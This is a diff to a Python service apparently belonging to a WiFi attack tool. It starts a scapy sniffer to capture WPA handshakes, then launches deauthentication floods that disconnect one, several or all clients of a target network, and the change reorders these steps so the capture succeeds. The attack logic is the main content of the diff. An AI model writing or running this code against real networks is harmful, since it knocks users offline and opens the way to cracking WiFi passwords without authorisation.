@@ -5,7 +5,7 @@ from scapy.all import AsyncSniffer
 from models import WifiNetworkModel
 from models.enums import DeauthType
 from utils.network import DeauthPackets, wifi_packets_callback, wifi_packets_clear
-
+from state import app_state
 
 class HandshakeService():
     # Current target. Mass attack support will be added in future versions.
@@ -18,16 +18,9 @@ class HandshakeService():
     async def start_catching(self, device, attack_type):
         if self._sniffer and self._sniffer.running:
             return 
-        deauth = DeauthPackets()
+        network = app_state.current_network
+        deauth = DeauthPackets(network.bssid, device)
         self.queue = asyncio.Queue()
-
-        match attack_type:
-            case DeauthType.ALL:
-                self.deauth_task = asyncio.create_task(deauth.kill_all_users())
-            case DeauthType.MANY:
-                self.deauth_task = asyncio.create_task(deauth.kill_many_users())
-            case DeauthType.ONE:
-                self.deauth_task = asyncio.create_task(deauth.kill_one_user()) 
 
         wifi_packets_clear()
 
@@ -38,8 +31,19 @@ class HandshakeService():
             store = 0
         )
         self._sniffer.start()
+
         print("handshake sniffer was started")
 
+        await asyncio.sleep(1)
+
+        match attack_type:
+            case DeauthType.ALL:
+                self.deauth_task = asyncio.create_task(deauth.kill_all_users())
+            case DeauthType.MANY:
+                self.deauth_task = asyncio.create_task(deauth.kill_many_users())
+            case DeauthType.ONE:
+                self.deauth_task = asyncio.create_task(deauth.kill_one_user()) 
+        print("deauth packets was sended")
     async def stop_catching(self):
         if self.deauth_task:
             self.deauth_task.cancel()
